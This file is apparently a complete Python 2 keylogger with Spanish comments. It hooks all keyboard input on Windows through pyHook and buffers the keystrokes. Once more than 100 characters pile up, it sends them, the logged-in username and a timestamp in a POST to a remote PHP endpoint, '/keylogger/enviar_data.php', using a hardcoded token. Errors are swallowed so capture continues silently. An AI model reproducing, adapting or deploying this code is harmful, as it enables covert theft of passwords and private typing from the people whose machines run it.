#-*- coding:utf-8 -*-
#Modulos
import os
import threading
import time
import pyHook
import pythoncom
import urllib,urllib2
#Variables Globales
data = ""
#Funciones
def enviar_data():
        
	global data
	if len(data) > 100:
                
		fecha = time.strftime('%Y/%m/%d|%H:%M:%S')
		nombre = str(os.environ.get("USERNAME"))
		print nombre
		message = data
		data = ""
                try:
                             parametros = {'nombre':nombre,'fecha':fecha,'data':message,'token':'f5f0634c1b1dfdca4a1f632564d06b49e5563e30b82a61fec5d55734a9853e1c'}
                             params = urllib.urlencode(parametros)
                             req = urllib2.urlopen("http://192.168.1.72/keylogger/enviar_data.php",params)
                             print req.read()
                             
                except:
                             print "error"
                                           
                       
                
              
def OnKeyboardEvent(event):
	global data #Variable Global
	key = event.Ascii
	if key == 12:
		key = " [ENTER] "
	elif key == 8:
		key = " [BACK SPACE] "
	elif key == 9:
		key = " [TAB] "
	else:
	    key = chr(event.Ascii)
	data = data+key
	print len(data)
	segundo_plano = threading.Thread(target=enviar_data)
	segundo_plano.start()
	
try:
        
        
        hm = pyHook.HookManager()

        hm.KeyDown = OnKeyboardEvent

        hm.HookKeyboard()

        pythoncom.PumpMessages()
except:
        pass

